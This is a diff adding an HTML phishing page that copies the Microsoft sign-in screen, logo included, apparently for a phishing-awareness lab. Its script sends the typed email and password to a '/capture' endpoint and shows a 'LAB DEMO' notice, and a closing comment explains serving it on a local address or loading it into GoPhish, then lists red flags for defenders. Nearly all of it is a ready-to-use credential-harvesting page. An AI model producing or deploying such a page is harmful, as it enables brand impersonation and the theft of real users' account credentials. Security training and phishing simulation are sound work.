@@ -1,0 +1,95 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>Sign in to your account</title>
+  <style>
+    *{box-sizing:border-box;margin:0;padding:0}
+    body{font-family:"Segoe UI",Arial,sans-serif;background:#f2f2f2;
+         display:flex;align-items:center;justify-content:center;min-height:100vh}
+    .box{background:#fff;padding:44px;width:440px;box-shadow:0 2px 6px rgba(0,0,0,.2);border-radius:2px}
+    h1{font-size:24px;font-weight:600;margin:20px 0 6px}
+    .sub{color:#605e5c;font-size:13px;margin-bottom:24px}
+    label{display:block;font-size:14px;margin-bottom:5px}
+    input[type=text],input[type=password]{
+      width:100%;padding:8px 10px;border:1px solid #8a8886;
+      font-size:14px;border-radius:2px;margin-bottom:16px;outline:none}
+    input:focus{border:2px solid #0078d4}
+    .btn{width:100%;padding:10px;background:#0078d4;color:#fff;border:none;
+         font-size:14px;font-weight:600;border-radius:2px;cursor:pointer}
+    .btn:hover{background:#106ebe}
+    .links{margin-top:18px;font-size:13px}
+    .links a{color:#0078d4;text-decoration:none}
+    .footer{text-align:center;margin-top:22px;font-size:11px;color:#605e5c}
+    .footer a{color:#0078d4;text-decoration:none;margin:0 6px}
+    #notice{display:none;margin-top:14px;padding:12px;background:#dff0d8;
+            border:1px solid #3c763d;color:#3c763d;font-size:13px;border-radius:3px}
+  </style>
+</head>
+<body>
+<div class="box">
+
+  <!-- Microsoft logo -->
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 23 23" height="24">
+    <rect x="1"  y="1"  width="10" height="10" fill="#f25022"/>
+    <rect x="12" y="1"  width="10" height="10" fill="#7fba00"/>
+    <rect x="1"  y="12" width="10" height="10" fill="#00a4ef"/>
+    <rect x="12" y="12" width="10" height="10" fill="#ffb900"/>
+  </svg>
+
+  <h1>Sign in</h1>
+  <p class="sub">Use your Microsoft account</p>
+
+  <form id="f" onsubmit="return submit_form(event)">
+    <label>Email or phone</label>
+    <input type="text" id="u" placeholder="name@example.com" required>
+
+    <label>Password</label>
+    <input type="password" id="p" required>
+
+    <div style="margin-bottom:16px;font-size:13px">
+      <input type="checkbox" id="k">
+      <label for="k" style="display:inline;font-weight:normal;cursor:pointer">Keep me signed in</label>
+    </div>
+
+    <button type="submit" class="btn">Sign in</button>
+  </form>
+
+  <div id="notice"></div>
+
+  <div class="links"><a href="#">Can't access your account?</a></div>
+  <div class="footer">
+    <a href="#">Terms of use</a><a href="#">Privacy & cookies</a>
+  </div>
+</div>
+
+<script>
+function submit_form(e){
+  e.preventDefault();
+  var u = document.getElementById('u').value;
+  var p = document.getElementById('p').value;
+  fetch('/capture',{
+    method:'POST',
+    headers:{'Content-Type':'application/x-www-form-urlencoded'},
+    body:'username='+encodeURIComponent(u)+'&password='+encodeURIComponent(p)
+  }).catch(()=>{});
+  var n = document.getElementById('notice');
+  n.style.display='block';
+  n.innerHTML='<strong>LAB DEMO:</strong> Captured → '+u+' / '+p+
+    '<br>In real attack: silent redirect to real Microsoft login.';
+  return false;
+}
+</script>
+</body>
+</html>
+
+<!--
+Standalone: served by tools/http_server.py at http://192.168.11.149:8080/
+GoPhish:    paste into Landing Page editor, enable "Capture Submitted Data"
+
+Blue team red flags:
+  • Address bar domain ≠ login.microsoftonline.com
+  • No HTTPS / certificate mismatch
+  • Password field on same screen as email (real MS uses two screens)
+  • Browser autofill does not trigger (domain mismatch)
+-->
